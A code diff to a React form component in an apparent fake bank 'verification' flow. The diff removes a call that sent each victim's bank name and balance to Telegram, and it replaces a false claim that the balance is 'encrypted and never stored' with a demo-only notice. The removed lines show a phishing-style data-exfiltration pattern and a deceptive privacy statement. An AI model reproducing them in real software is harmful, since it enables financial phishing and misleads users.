@@ -3,7 +3,6 @@
 import { useMemo, useState, type FormEvent } from 'react'
 import { useRouter } from 'next/navigation'
 import { ChevronRight, Info } from 'lucide-react'
-import { notifyTelegram } from '@/lib/notify'
 
 const TOTAL_STEPS = 5
 
@@ -29,10 +28,6 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
   function handleSubmit(e: FormEvent) {
     e.preventDefault()
     if (!isValid) return
-    notifyTelegram('Account Balance Submitted', [
-      { label: 'Bank', value: bankName },
-      { label: 'Balance (PKR)', value: display },
-    ])
     // Continue to the final verification (re-confirm OTP) step.
     router.push(`/bank/${slug}/verify`)
   }
@@ -71,8 +66,8 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
       <div className="mt-4 flex items-start gap-2 rounded-2xl border border-primary/20 bg-primary/5 px-4 py-3">
         <Info className="mt-0.5 h-4 w-4 shrink-0 text-primary" aria-hidden="true" />
         <p className="text-sm leading-relaxed text-primary">
-          This is required to verify your account. Your balance is encrypted and
-          never stored on our servers.
+          This field is simulated for demonstration only. Nothing is sent to a bank,
+          stored, or transmitted to any server.
         </p>
       </div>
 
